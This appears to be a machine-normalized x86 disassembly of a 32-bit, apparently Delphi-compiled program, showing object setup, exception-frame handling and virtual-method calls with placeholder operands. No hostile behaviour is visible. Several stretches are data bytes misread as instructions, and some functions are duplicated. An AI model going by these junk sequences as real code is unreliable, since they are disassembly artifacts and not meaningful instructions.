add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] ah
add [ edx ] al
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + edi * 8 + 0xc0041 ] ch
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax ] ah
add [ eax ] al
add [ esp + edx * 2 ] cl
dec eax
insb
jo r-xdata
mov al 0xfe
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41fe ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
inc [ ecx ]
adc [ eax ] al
add [ eax ] al
loopne r-xdata
mov eax rw-data
call sub_44b8f0
retn
sub edx 0xffffffdc
[ eax ]
add ah bh
mov [ esi ] cl
int1
inc [ eax ]
add ah bh
mov [ esi ] cl
inc [ eax ]
add ah bh
mov [ esi ] cl
inc [ eax ]
add ah bh
mov [ esi ] cl
hlt
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0xe004481 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bl
sti
inc ecx
add [ eax + eax ] al
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
sub_41ff38
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
call sub_41ff0c
mov eax ebx
mov edx [ rw-data ]
mov ecx r-xdata
call sub_44b91c
cmp [ ebx ] 0x0
setne al
pop ebx
pop ebp
retn
xor eax eax
mov [ ebx ] eax
sub_41ff78
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
lea eax [ edi + 0x4 ]
mov edx esi
call sub_44b8f0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_41ffbc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x20 ]
xor edx edx
call sub_449d2c
mov [ esi + 0x18 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_420020
push ebx
push esi
push edi
push ebp
call sub_44873c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc edi
mov eax [ ebp + 0x14 ]
call sub_4481b0
mov eax [ ebp + 0x10 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4481a0
test bl bl
jle r-xdata
lea eax [ ebp + 0xc ]
call sub_44b8d8
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4246e8
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax esi
call sub_4481b0
dec edi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
sub_420098
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_420138
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ff78
mov esi eax
mov eax [ ebx + 0x18 ]
mov [ esi + 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_424590
mov edx [ ebx + 0x18 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_43bff8
test al al
je r-xdata
inc [ ebx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
test edx edx
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_424590
mov ecx r-xdata
call sub_44b91c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42013f
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub edx 0xfffffff8
sub_420168
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax edi
call sub_44b8d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x4 ]
mov eax edi
call sub_44b8f0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov edx ebx
mov eax [ esi + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x4 ]
mov eax edi
call sub_44b8f0
sub_4201d8
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4246e8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_420208
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4202ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] 0x0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
lea eax [ edi + 0x20 ]
mov edx [ ebp - 0xc ]
call sub_449d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202b3
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4246e8
mov eax [ eax + 0x4 ]
push eax
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
pop eax
call sub_43bff8
test al al
je r-xdata
sub_420578
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4205ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_44b91c
mov eax [ ebp - 0x8 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4205f3
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub_42060c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420885
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x20
mov edx [ ebp - 0x18 ]
call sub_449d2c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
inc ebx
xor esi esi
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0x1c ]
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_420578
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0xc ]
call sub_44b8f0
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_44b91c
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_420578
pop ecx
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_44b91c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42088c
lea eax [ ebp - 0x34 ]
call sub_44b8d8
lea eax [ ebp - 0x30 ]
call j_sub_449348
lea eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_44a7e8
lea eax [ ebp - 0x10 ]
call sub_44b8d8
lea eax [ ebp - 0xc ]
call sub_44b8d8
retn
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_420578
pop ecx
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_420821
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
inc ebx
xor esi esi
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_420578
pop ecx
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_44b91c
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
inc esi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_4481b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4246e8
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_44b91c
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_4208b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4209b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420966
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42096d
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
inc esi
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_4246e8
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42096d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4209b8
lea eax [ ebp - 0x14 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub_4209c0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_420a7f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x20 ]
mov edx ebx
call sub_449d2c
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a86
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_44b91c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_420b38
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420c55
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x19 ] 0x0
test ebx ebx
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x20
mov edx ebx
call sub_449d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c5c
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x18 ]
call sub_4246e8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_44b8f0
xor eax eax
push ebp
push sub_420c24
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp - 0x19 ] al
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x11 ] 0x1
call sub_448d2c
jmp r-xdata
retn
movzx edx [ ebp - 0x19 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_420c65
add [ eax ] al
add [ ecx ] cl
pop [ ecx + 0x69 ]
dec ecx
pop esi
cdq
dec eax
sahf
adc ebx [ edi + 0x7549c1e3 ]
push bp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420db8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420d52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_449d2c
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_420168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d59
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4246e8
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_43bff8
test al al
je r-xdata
sub_420c78
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420db8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420d52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_449d2c
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_420168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d59
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4246e8
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_43bff8
test al al
je r-xdata
sub_420d59
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_44b91c
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420dbf
lea eax [ ebp - 0x1c ]
call sub_44b8d8
lea eax [ ebp - 0x18 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub_420dc5
add [ eax ] al
add [ ecx - 0x5d ] bh
inc esi
fstp [ edx - 0x76b955aa ]
in eax 0x8a
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
xor [ fs : ebx + 0x55 ] cl
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420f18
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420eb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_449d2c
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_420168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420eb9
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4246e8
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_43bff8
test al al
je r-xdata
sub_420dd8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420f18
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420eb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_449d2c
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_420168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420eb9
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4246e8
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_43bff8
test al al
je r-xdata
sub_420eb9
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_44b91c
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f1f
lea eax [ ebp - 0x1c ]
call sub_44b8d8
lea eax [ ebp - 0x18 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub_420f25
add [ eax ] al
add [ ecx - 0x5d ] bh
inc esi
fstp [ edx - 0x76b955aa ]
in eax 0x8a
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
xor [ fs : ebx + 0x55 ] cl
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421023
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ esi + 0x20 ]
mov edx ebx
call sub_449d2c
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42102a
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
inc eax
xor ebx ebx
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
